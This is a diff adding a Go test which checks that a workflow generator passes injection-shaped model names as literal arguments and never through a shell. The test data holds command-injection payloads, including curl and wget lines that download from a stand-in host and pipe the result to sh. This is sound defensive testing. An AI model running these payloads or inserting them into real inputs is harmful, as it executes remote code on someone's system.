@@ -73,6 +73,35 @@ func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
 	}
 }
 
+// TestGenerateWorkflowInjectionShapedModelIsArgvSafe covers acceptance criterion 2 of SEC-006:
+// injection-shaped model strings must be passed as literal argv args, never evaluated by a shell.
+func TestGenerateWorkflowInjectionShapedModelIsArgvSafe(t *testing.T) {
+	maliciousModels := []string{
+		"$(touch /tmp/pwn)",
+		"`id`",
+		"model; curl bad-url | sh",
+		"model && wget http://bad.example.com/x -O /tmp/x && sh /tmp/x",
+	}
+	for _, model := range maliciousModels {
+		manifest, _, err := GenerateWorkflow(WorkflowRequest{
+			Name:  "train-custom",
+			Model: model,
+		})
+		if err != nil {
+			t.Fatalf("model=%q: unexpected error: %v", model, err)
+		}
+		// Must use echo (argv-safe), never sh/bash/shell launcher
+		if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, "bash -c") {
+			t.Fatalf("model=%q: manifest uses shell launcher:\n%s", model, manifest)
+		}
+		if !strings.Contains(manifest, "- echo") {
+			t.Fatalf("model=%q: manifest missing expected echo command:\n%s", model, manifest)
+		}
+	}
+}
+
+// TestGenerateWorkflowRejectsShellLauncherArgsBypass verifies split command/args
+// shell launcher bypass attempts (e.g. command=["/bin/sh"], args=["-c", "..."]) are blocked.
 func TestGenerateWorkflowRejectsShellLauncherArgsBypass(t *testing.T) {
 	_, _, err := GenerateWorkflow(WorkflowRequest{
 		Name:    "train",
